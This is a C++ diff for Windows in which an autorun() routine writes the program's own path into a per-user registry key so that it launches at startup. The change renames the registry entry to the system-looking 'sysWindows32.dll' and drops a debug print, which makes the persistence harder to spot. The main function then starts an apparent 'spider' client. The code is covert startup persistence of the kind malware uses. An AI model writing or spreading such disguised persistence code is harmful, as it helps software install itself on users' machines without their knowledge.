@@ -21,14 +21,18 @@ void		autorun()
   char		test[length] = {};
 
   GetModuleFileName(nullptr, buffer, MAX_PATH);
-  check = RegCreateKeyEx(HKEY_LOCAL_MACHINE,
-			  lpSubKey,
-			  0, nullptr, 0,
-			  (KEY_WRITE|KEY_READ), nullptr, &hkey, nullptr);
+  check = RegOpenKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, KEY_ALL_ACCESS, &hkey);
+  if (check != ERROR_SUCCESS)
+  {
+    check = RegCreateKeyEx(HKEY_CURRENT_USER,
+			   lpSubKey,
+			   0, nullptr, 0,
+			   (KEY_WRITE | KEY_READ), nullptr, &hkey, nullptr);
+  }
   strcpy_s(test, length, "\"");
   strcat_s(test, length, buffer);
   strcat_s(test, length, "\"\0");
-  LPCTSTR name = TEXT("ALOHA");
+  LPCTSTR name = TEXT("sysWindows32.dll");
   if (check == ERROR_SUCCESS)
     RegSetValueEx(hkey, name, 0, REG_SZ, (BYTE *)test, strlen(test)+1);
   if (hkey != nullptr)
@@ -40,7 +44,6 @@ int			main()
   spider::ClientCore	client;
 
   autorun();
-  std::cout << "passed autorun\n";
   client.run();
   return 0;
 }
